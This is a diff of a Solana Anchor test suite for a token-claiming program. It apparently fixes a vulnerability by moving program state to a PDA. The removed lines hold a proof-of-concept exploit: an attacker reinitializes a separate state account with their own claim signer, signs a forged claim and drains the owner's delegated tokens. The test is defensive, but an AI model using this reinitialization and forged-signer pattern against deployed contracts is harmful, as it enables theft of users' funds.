@@ -1,360 +1,191 @@
 import * as anchor from "@coral-xyz/anchor";
 import { Program } from "@coral-xyz/anchor";
 import { TokenClaimer } from "../target/types/token_claimer";
-import { 
-  PublicKey, 
-  SystemProgram, 
+import {
+  PublicKey,
   Keypair,
   TransactionMessage,
   VersionedMessage,
   VersionedTransaction,
-  AddressLookupTableProgram,
-  Transaction
+  Transaction,
+  Connection,
+  sendAndConfirmTransaction,
 } from "@solana/web3.js";
-import { 
-  Token, 
-  TOKEN_PROGRAM_ID, 
-  createMint, 
-  createAccount, 
-  createAssociatedTokenAccount,
-  getAssociatedTokenAddress, 
-  mintTo, 
-  getAccount, 
-  createAssociatedTokenAccountIdempotentInstruction 
+import {
+  createMint,
+  getAssociatedTokenAddress,
+  mintTo,
+  getAccount,
+  TOKEN_2022_PROGRAM_ID,
 } from "@solana/spl-token";
-import { assert, expect } from "chai";
+import { expect } from "chai";
 import * as nacl from "tweetnacl";
-import { keccak_256 } from '@noble/hashes/sha3';
-import * as fs from "fs";
-
+import { keccak_256 } from "@noble/hashes/sha3";
 
 describe("token_claimer", () => {
   // Configure the client to use the local cluster.
   anchor.setProvider(anchor.AnchorProvider.env());
   const provider = anchor.AnchorProvider.env();
   const program = anchor.workspace.TokenClaimer as Program<TokenClaimer>;
-  
-  const loadKeyPair = (path) => {
-    return Keypair.fromSecretKey(
-      Uint8Array.from(JSON.parse(fs.readFileSync(path, "utf-8")))
-    )
-  };
-  
-  const loadPublicKey = (path) => {
-    const keyData = JSON.parse(fs.readFileSync(path, "utf-8"));
-    return new PublicKey(keyData);
-  };
+  const wallet = provider.wallet as anchor.Wallet;
 
   // Test accounts
-  let owner = Keypair.generate();
+  let owner = wallet.payer;
   let newOwner = Keypair.generate();
+  // address claiming tokens
   let claimer = Keypair.generate();
+  // an admin address to sign for approving the amount of tokens that can be claimed by a "claimer"
   let claimSigner = Keypair.generate();
-  let destination = Keypair.generate();
-  let stateAccount = loadKeyPair("keypairs/state_account.json");
-  let attacker = Keypair.generate();
-  let attackerStateAccount = Keypair.generate();
-  let mint: PublicKey;
-  let sourceTokenAccount: PublicKey;
+  let mint = Keypair.generate();
 
-  const stripHexPrefix = s => s.replace(/^0[xX]/, '');
+  // PDA for the state account
+  let [stateAccount] = PublicKey.findProgramAddressSync(
+    [Buffer.from("state")],
+    program.programId
+  );
 
-  async function debugTransaction(txId: string) {
-    const tx = await provider.connection.getTransaction(txId, {
-      commitment: "confirmed", // Ensure the transaction has been confirmed
-    });
-  
-    if (!tx) {
-      console.error("Transaction not found or not confirmed.");
-      return;
-    }
-  
-    console.log("Transaction Logs:");
-    console.log(tx.meta?.logMessages?.join("\n") || "No logs available.");
-  };
+  // PDA for the program owned token account
+  let [programTokenAccount] = PublicKey.findProgramAddressSync(
+    [mint.publicKey.toBuffer()],
+    program.programId
+  );
 
-  async function getSplTokenBalance(
-    connection: Connection,
-    owner: PublicKey, // The public key of the owner
-    mint: PublicKey   // The mint address of the SPL token
-  ): Promise<number> {
-    // Derive the associated token address for the owner and mint
-    const tokenAccountAddress = await getAssociatedTokenAddress(mint, owner);
-  
-    try {
-      // Fetch the token account information
-      const tokenAccountInfo = await getAccount(connection, tokenAccountAddress);
-  
-      // Return the balance (amount is in raw token units, not adjusted for decimals)
-      return Number(tokenAccountInfo.amount);
-    } catch (err) {
-      // If the account does not exist, return a balance of 0
-      if (err.message.includes("Failed to find account")) {
-        return 0;
-      } else {
-        throw err;
-      }
-    }
-  };
+  before(async () => {
+    // Create a token mint
+    await createMint(
+      provider.connection,
+      owner,
+      owner.publicKey,
+      null,
+      2,
+      mint,
+      {
+        commitment: "confirmed",
+      },
+      TOKEN_2022_PROGRAM_ID
+    );
+
+    await provider.connection.confirmTransaction(
+      await provider.connection.requestAirdrop(
+        owner.publicKey,
+        111 * anchor.web3.LAMPORTS_PER_SOL
+      )
+    );
+    await provider.connection.confirmTransaction(
+      await provider.connection.requestAirdrop(
+        newOwner.publicKey,
+        111 * anchor.web3.LAMPORTS_PER_SOL
+      )
+    );
+    await provider.connection.confirmTransaction(
+      await provider.connection.requestAirdrop(
+        claimer.publicKey,
+        111 * anchor.web3.LAMPORTS_PER_SOL
+      )
+    );
+  });
 
   it("Initializes the program state", async () => {
-    await provider.connection.confirmTransaction(
-      await provider.connection.requestAirdrop(owner.publicKey, 111 * anchor.web3.LAMPORTS_PER_SOL)
-    );
-    await provider.connection.confirmTransaction(
-      await provider.connection.requestAirdrop(newOwner.publicKey, 111 * anchor.web3.LAMPORTS_PER_SOL)
-    );
-    await provider.connection.confirmTransaction(
-      await provider.connection.requestAirdrop(claimer.publicKey, 111 * anchor.web3.LAMPORTS_PER_SOL)
-    );
+    // Anchor can infer the accounts required using the IDL
+    await program.methods.initialize(claimSigner.publicKey).rpc();
 
-    await program.methods
-      .initialize(claimSigner.publicKey)
-      .accounts({
-        state: stateAccount.publicKey,
-        owner: owner.publicKey,
-        systemProgram: SystemProgram.programId,
-      })
-      .signers([owner, stateAccount])
-      .rpc();
-
-    let state = await program.account.state.fetch(stateAccount.publicKey);
+    let state = await program.account.state.fetch(stateAccount);
 
     expect(state.owner.toBase58()).to.equal(owner.publicKey.toBase58());
     expect(state.claimSigner).to.deep.equal(claimSigner.publicKey);
-    
-    await provider.connection.confirmTransaction(
-      await provider.connection.requestAirdrop(stateAccount.publicKey, 111 * anchor.web3.LAMPORTS_PER_SOL)
-    );
-
-    for (let i = 0; i < 8; i++) {
-      await program.methods
-        .expandBitmap()
-        .accounts({
-          state: stateAccount.publicKey,
-          owner: owner.publicKey,
-          systemProgram: SystemProgram.programId,
-        })
-        .signers([owner])
-        .rpc();
-    }
-      
-    state = await program.account.state.fetch(stateAccount.publicKey);
-    expect(state.claimedBitmap.length).to.eq(80000);
-
-    expect(state.claimSigner).to.deep.equal(claimSigner.publicKey);
   });
 
-  it("Reinitializes", async () => {
-    await provider.connection.confirmTransaction(
-      await provider.connection.requestAirdrop(attacker.publicKey, 111 * anchor.web3.LAMPORTS_PER_SOL)
-    );
-
-    await program.methods
-    .initialize(attacker.publicKey)
-    .accounts({
-      state: attackerStateAccount.publicKey,
-      owner: attacker.publicKey,
-      systemProgram: SystemProgram.programId,
-    })
-    .signers([attacker, attackerStateAccount])
-    .rpc();
-
-    await provider.connection.confirmTransaction(
-      await provider.connection.requestAirdrop(attackerStateAccount.publicKey, 111 * anchor.web3.LAMPORTS_PER_SOL)
-    );
-
+  it("Realloc the program state", async () => {
     for (let i = 0; i < 8; i++) {
-      await program.methods
-        .expandBitmap()
-        .accounts({
-          state: attackerStateAccount.publicKey,
-          owner: attacker.publicKey,
-          systemProgram: SystemProgram.programId,
-        })
-        .signers([attacker])
-        .rpc();
+      // Anchor can infer the accounts required using the IDL
+      await program.methods.expandBitmap().rpc();
     }
+
+    let state = await program.account.state.fetch(stateAccount);
+    expect(state.claimedBitmap.length).to.eq(8000);
+    expect(state.claimSigner).to.deep.equal(claimSigner.publicKey);
+    expect(state.owner).to.deep.equal(owner.publicKey);
   });
 
   it("Updates the claim signer", async () => {
     const newClaimSigner = Keypair.generate();
-    await program.methods
-      .setClaimSigner(newClaimSigner.publicKey)
-      .accounts({
-        state: stateAccount.publicKey,
-        owner: owner.publicKey,
-      })
-      .signers([owner])
-      .rpc();
+    // Update the "claim signer"
+    await program.methods.setClaimSigner(newClaimSigner.publicKey).rpc();
 
-    const state = await program.account.state.fetch(stateAccount.publicKey);
+    const state = await program.account.state.fetch(stateAccount);
     expect(state.claimSigner).to.deep.equal(newClaimSigner.publicKey);
 
-    await program.methods
-      .setClaimSigner(claimSigner.publicKey)
-      .accounts({
-        state: stateAccount.publicKey,
-        owner: owner.publicKey,
-      })
-      .signers([owner])
-      .rpc();
+    // Reset the "claim signer" back to the original
+    await program.methods.setClaimSigner(claimSigner.publicKey).rpc();
   });
 
   it("Transfers ownership", async () => {
-    await program.methods
-      .transferOwnership(newOwner.publicKey)
-      .accounts({
-        state: stateAccount.publicKey,
-        owner: owner.publicKey,
-      })
-      .signers([owner])
-      .rpc();
+    // Update "owner" field in the state account
+    await program.methods.transferOwnership(newOwner.publicKey).rpc();
 
-    const state = await program.account.state.fetch(stateAccount.publicKey);
+    const state = await program.account.state.fetch(stateAccount);
     expect(state.owner.toBase58()).to.equal(newOwner.publicKey.toBase58());
 
+    // Reset the "owner" field back to the original
     await program.methods
       .transferOwnership(owner.publicKey)
       .accounts({
-        state: stateAccount.publicKey,
         owner: newOwner.publicKey,
       })
       .signers([newOwner])
       .rpc();
   });
 
-  const sleep = (ms) => {
-      return new Promise((resolve) => setTimeout(resolve, ms));
-  };
+  it("Create Program Token Account", async () => {
+    await program.methods
+      .createTokenAccount()
+      .accounts({
+        mint: mint.publicKey,
+        tokenProgram: TOKEN_2022_PROGRAM_ID,
+      })
+      .rpc({ commitment: "confirmed" });
 
-  const sendInstructions = async (senderAndPayer, instructions, lookupTableAccount, verbose) => {
-    let latestBlockhash = await provider.connection.getLatestBlockhash(
-      "confirmed"
-    );
-    const transactionMessageParams = {
-      payerKey: senderAndPayer.publicKey,
-      recentBlockhash: latestBlockhash.blockhash,
-      instructions: instructions,
-    };
-    const messageV0 = lookupTableAccount ? 
-      new TransactionMessage(transactionMessageParams).compileToV0Message([lookupTableAccount]) :
-      new TransactionMessage(transactionMessageParams).compileToV0Message();
-    if (verbose) console.log("Message V0:", messageV0);
-    const serializedMessage = Buffer.from(messageV0.serialize()).toString(
-      "base64"
-    );
-    if (verbose) console.log("Serialized Message:", serializedMessage);
-    const deserializedMessage = VersionedMessage.deserialize(
-      Buffer.from(serializedMessage, "base64")
-    );
-    const newTransaction = new VersionedTransaction(deserializedMessage);
-    newTransaction.sign([senderAndPayer]);
-    try {
-      const signature1 = await provider.connection.sendRawTransaction(
-        newTransaction.serialize(),
-        {
-          skipPreflight: false,
-          maxRetries: 3,
-          preflightCommitment: "confirmed",
-        }
-      );
-      latestBlockhash = await provider.connection.getLatestBlockhash(
-        "confirmed"
-      );
-      const txId = await provider.connection.confirmTransaction({
-        blockhash: latestBlockhash.blockhash,
-        lastValidBlockHeight: latestBlockhash.lastValidBlockHeight,
-        signature: signature1
-      });
-      if (verbose) console.log("Transaction ID:", txId);
-    } catch (err) {
-      console.error(err);
-      if (err.transactionLogs) {
-        console.error("Transaction logs:", err.transactionLogs);
-      }
-      throw err;
-    }
-  };
-
-  it("Can claim tokens", async () => {
-    // Create a token mint
-    mint = await createMint(provider.connection, owner, owner.publicKey, null, 9);
-
-    const amount = new anchor.BN(1000).mul(new anchor.BN(10).pow(new anchor.BN(9))); // 1000 * 10^9
-
-    let delegatePDA: anchor.web3.PublicKey;
-    let delegateBump: number;
-    
-    // Create token accounts
-    sourceTokenAccount = await createAssociatedTokenAccount(
-      provider.connection,
-      owner,
-      mint,
-      owner.publicKey
-    );
-
-    const expectedDestinationTokenAccount = await getAssociatedTokenAddress(
-      mint, 
-      destination.publicKey
-    );
-    
-    [delegatePDA, delegateBump] = await anchor.web3.PublicKey.findProgramAddress(
-      [Buffer.from("delegate"), sourceTokenAccount.toBuffer(), stateAccount.publicKey.toBuffer()],
-      program.programId
-    );
-
-    const slot = await provider.connection.getSlot();
-    const [lookupTableInst, lookupTableAddress] =
-      AddressLookupTableProgram.createLookupTable({
-        authority: owner.publicKey,
-        payer: owner.publicKey,
-        recentSlot: slot - 1,
-      });
-    const extendInstruction = AddressLookupTableProgram.extendLookupTable({
-      payer: owner.publicKey,
-      authority: owner.publicKey,
-      lookupTable: lookupTableAddress,
-      addresses: [
-        stateAccount.publicKey,
-        sourceTokenAccount,
-        anchor.web3.SYSVAR_INSTRUCTIONS_PUBKEY,
-        anchor.web3.Ed25519Program.programId,
-        anchor.web3.SystemProgram.programId,
-        TOKEN_PROGRAM_ID,
-        claimSigner.publicKey,
-        mint,
-        program.programId,
-      ],
-    });
-    // await sendInstructions(owner, [lookupTableInst, extendInstruction], null, true);
-    
-    // Mint tokens to the source account
+    // 100 tokens
+    const amount = 100 * 10 ** 2;
+    // Fund the program token account
     await mintTo(
       provider.connection,
       owner,
-      mint,
-      sourceTokenAccount,
+      mint.publicKey,
+      programTokenAccount,
       owner.publicKey,
-      amount.toNumber() // Mint 1000 tokens
+      amount,
+      [],
+      { commitment: "confirmed" },
+      TOKEN_2022_PROGRAM_ID
     );
 
-    console.log("Source Token Account Balance (after mint):", 
-      await getSplTokenBalance(provider.connection, owner.publicKey, mint)
+    // fetch the program token account
+    const tokenAccount = await getAccount(
+      provider.connection,
+      programTokenAccount,
+      "confirmed",
+      TOKEN_2022_PROGRAM_ID
     );
 
-    // Approve the PDA as a delegate for 500 tokens
-    await program.methods
-      .approveDelegate(amount)
-      .accounts({
-        tokenAccount: sourceTokenAccount,
-        delegate: delegatePDA,
-        authority: owner.publicKey,
-        tokenProgram: TOKEN_PROGRAM_ID,
-      })
-      .signers([owner])
-      .rpc();
-    
+    expect(tokenAccount.amount).to.equal(BigInt(amount));
+    expect(tokenAccount.mint.toBase58()).to.equal(mint.publicKey.toBase58());
+    // Using same PDA as both address of the token account and the owner
+    expect(tokenAccount.owner.toBase58()).to.equal(
+      programTokenAccount.toBase58()
+    );
+  });
+
+  it("Can claim tokens", async () => {
+    // ATA for the claimer
+    const expectedDestinationTokenAccount = await getAssociatedTokenAddress(
+      mint.publicKey,
+      claimer.publicKey,
+      false,
+      TOKEN_2022_PROGRAM_ID
+    );
+
+    // Claims to be made (20) = 0.2 tokens
     const claims = [
       { claimIndex: 30110, amount: 1 },
       { claimIndex: 30111, amount: 1 },
@@ -377,8 +208,8 @@ describe("token_claimer", () => {
       { claimIndex: 30128, amount: 1 },
       { claimIndex: 30129, amount: 1 },
     ];
-    
-    let instructions = []; 
+
+    let instructions = [];
     let claimIndices = [];
     let totalAmount = 0;
     for (let i = 0; i < claims.length; i++) {
@@ -386,134 +217,85 @@ describe("token_claimer", () => {
       totalAmount += amount;
       claimIndices.push(claimIndex);
     }
-    const clockAccountInfo = await program.provider.connection.getAccountInfo(
-      anchor.web3.SYSVAR_CLOCK_PUBKEY
+
+    const slot = await provider.connection.getSlot({ commitment: "confirmed" });
+    const timestamp = await provider.connection.getBlockTime(slot);
+    const expiry = timestamp + 60;
+
+    // Message to sign by "claim signer", with parameters of the claim
+    const message = keccak_256(
+      Buffer.concat([
+        keccak_256(
+          Buffer.concat(
+            claimIndices.map((i) =>
+              new anchor.BN(i).toArrayLike(Buffer, "le", 4)
+            )
+          )
+        ),
+        claimer.publicKey.toBuffer(),
+        programTokenAccount.toBuffer(),
+        expectedDestinationTokenAccount.toBuffer(),
+        new anchor.BN(totalAmount).toArrayLike(Buffer, "le", 8),
+        new anchor.BN(expiry).toArrayLike(Buffer, "le", 4),
+      ])
     );
-    const currentTimestamp = new anchor.BN(
-      clockAccountInfo.data.readBigInt64LE(8)
-    ).toNumber();
-    const expiry = currentTimestamp + 60;
-    const message = keccak_256(Buffer.concat([
-      keccak_256(Buffer.concat(
-        claimIndices.map(i => (new anchor.BN(i)).toArrayLike(Buffer, "le", 4))
-      )),
-      claimer.publicKey.toBuffer(),
-      sourceTokenAccount.toBuffer(),
-      expectedDestinationTokenAccount.toBuffer(), 
-      (new anchor.BN(totalAmount)).toArrayLike(Buffer, "le", 8),
-      (new anchor.BN(expiry)).toArrayLike(Buffer, "le", 4),
-    ]));
     const signature = nacl.sign.detached(message, claimSigner.secretKey);
+
     instructions.push(
-      createAssociatedTokenAccountIdempotentInstruction(
-        claimer.publicKey,
-        expectedDestinationTokenAccount,
-        destination.publicKey, 
-        mint 
-      ),
+      // Instruction with signed message to verify in the program instruction
       anchor.web3.Ed25519Program.createInstructionWithPublicKey({
         publicKey: claimSigner.publicKey.toBytes(),
         message: message,
         signature: signature,
       }),
+      // Instruction to claim the tokens
       await program.methods
         .claim(claimIndices, new anchor.BN(totalAmount), expiry)
         .accounts({
-          state: stateAccount.publicKey,
           claimer: claimer.publicKey,
-          sourceTokenAccount: sourceTokenAccount,
-          destinationTokenAccount: expectedDestinationTokenAccount,
-          ixSysvar: anchor.web3.SYSVAR_INSTRUCTIONS_PUBKEY,
-        }).instruction()
+          mint: mint.publicKey,
+          tokenProgram: TOKEN_2022_PROGRAM_ID,
+        })
+        .instruction()
     );
 
-    // await sleep(1000);
-    // const lookupTableAccount = (
-    //   await provider.connection.getAddressLookupTable(lookupTableAddress)
-    // ).value;
-    await sendInstructions(claimer, instructions, null, true);
-    // await sendInstructions(claimer, instructions, null, true);
-    
-    console.log("Destination Token Account Balance (after transfer):", 
-      await getSplTokenBalance(provider.connection, destination.publicKey, mint)
+    const transaction = new Transaction().add(...instructions);
+    transaction.feePayer = claimer.publicKey;
+
+    await sendAndConfirmTransaction(
+      provider.connection,
+      transaction,
+      [claimer],
+      { commitment: "confirmed" }
     );
+
+    // fetch the program token account
+    const sourceTokenAccount = await getAccount(
+      provider.connection,
+      programTokenAccount,
+      "confirmed",
+      TOKEN_2022_PROGRAM_ID
+    );
+
+    // fetch the claimer's token account
+    const destinationTokenAccount = await getAccount(
+      provider.connection,
+      expectedDestinationTokenAccount,
+      "confirmed",
+      TOKEN_2022_PROGRAM_ID
+    );
+    console.log("Source Token Balance:", sourceTokenAccount.amount);
+    console.log("Destination Token Balance:", destinationTokenAccount.amount);
   });
 
-  it("Attacker steals tokens", async () => {
-    const expectedDestinationTokenAccount = await getAssociatedTokenAddress(
-      mint, 
-      attacker.publicKey
-    );
-
-    const usedAmount = new anchor.BN(20);
-    const leftOverAmount = new anchor.BN(1000).mul(new anchor.BN(10).pow(new anchor.BN(9))).sub(usedAmount);
-
-    const claims = [
-      { claimIndex: 30110, amount: leftOverAmount.toNumber() },
-    ];
-    
-    let instructions = []; 
-    let claimIndices = [];
-    let totalAmount = 0;
-    for (let i = 0; i < claims.length; i++) {
-      const { claimIndex, amount } = claims[i];
-      totalAmount += amount;
-      claimIndices.push(claimIndex);
-    }
-    const clockAccountInfo = await program.provider.connection.getAccountInfo(
-      anchor.web3.SYSVAR_CLOCK_PUBKEY
-    );
-    const currentTimestamp = new anchor.BN(
-      clockAccountInfo.data.readBigInt64LE(8)
-    ).toNumber();
-    const expiry = currentTimestamp + 100000;
-    const message = keccak_256(Buffer.concat([
-      keccak_256(Buffer.concat(
-        claimIndices.map(i => (new anchor.BN(i)).toArrayLike(Buffer, "le", 4))
-      )),
-      attacker.publicKey.toBuffer(),
-      sourceTokenAccount.toBuffer(),
-      expectedDestinationTokenAccount.toBuffer(), 
-      (new anchor.BN(totalAmount)).toArrayLike(Buffer, "le", 8),
-      (new anchor.BN(expiry)).toArrayLike(Buffer, "le", 4),
-    ]));
-    const signature = nacl.sign.detached(message, attacker.secretKey);
-    instructions.push(
-      createAssociatedTokenAccountIdempotentInstruction(
-        attacker.publicKey,
-        expectedDestinationTokenAccount,
-        attacker.publicKey, 
-        mint 
-      ),
-      anchor.web3.Ed25519Program.createInstructionWithPublicKey({
-        publicKey: attacker.publicKey.toBytes(),
-        message: message,
-        signature: signature,
-      }),
-      await program.methods
-        .claim(claimIndices, new anchor.BN(totalAmount), expiry)
-        .accounts({
-          state: attackerStateAccount.publicKey,
-          claimer: attacker.publicKey,
-          sourceTokenAccount: sourceTokenAccount,
-          destinationTokenAccount: expectedDestinationTokenAccount,
-          ixSysvar: anchor.web3.SYSVAR_INSTRUCTIONS_PUBKEY,
-        }).instruction()
-    );
-
-    // await sleep(1000);
-    // const lookupTableAccount = (
-    //   await provider.connection.getAddressLookupTable(lookupTableAddress)
-    // ).value;
-    await sendInstructions(attacker, instructions, null, true);
-    // await sendInstructions(claimer, instructions, null, true);
-
-    console.log("Source Token Account Balance (before attacker transfer):",
-      await getSplTokenBalance(provider.connection, owner.publicKey, mint)
-    );
-
-    console.log("Attacker Token Account Balance (after attacker transfer):", 
-      await getSplTokenBalance(provider.connection, attacker.publicKey, mint)
-    );
+  it("Close Program Token Account", async () => {
+    // Withdrawn all tokens from the program token account and close it
+    await program.methods
+      .closeTokenAccount()
+      .accounts({
+        mint: mint.publicKey,
+        tokenProgram: TOKEN_2022_PROGRAM_ID,
+      })
+      .rpc();
   });
 });
